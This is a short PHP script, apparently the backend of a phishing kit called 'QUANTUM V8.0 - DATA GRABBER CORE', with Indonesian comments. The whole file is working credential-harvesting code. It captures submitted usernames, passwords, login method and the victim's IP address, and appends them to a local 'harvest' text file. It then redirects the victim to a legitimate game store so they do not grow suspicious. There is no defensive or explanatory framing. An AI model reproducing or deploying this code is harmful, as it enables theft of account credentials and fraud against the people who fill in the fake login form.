<?php
// QUANTUM V8.0 - DATA GRABBER CORE
$user = $_POST['user'];
$pass = $_POST['pass'];
$via  = $_POST['login_via'];
$ip   = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

// Format hasil panen
$data_result = "==============================\n";
$data_result .= "WAKTU     : " . $time . "\n";
$data_result .= "IP TARGET : " . $ip . "\n";
$data_result .= "LOGIN VIA : " . $via . "\n";
$data_result .= "USER/MAIL : " . $user . "\n";
$data_result .= "PASSWORD  : " . $pass . "\n";
$data_result .= "==============================\n";

// Simpen ke file teks
$save = fopen("panen_data.txt", "a");
fwrite($save, $data_result);
fclose($save);

// Buang korban ke web asli biar gak curiga
header("Location: https://www.tokogame.com");
exit();
?>
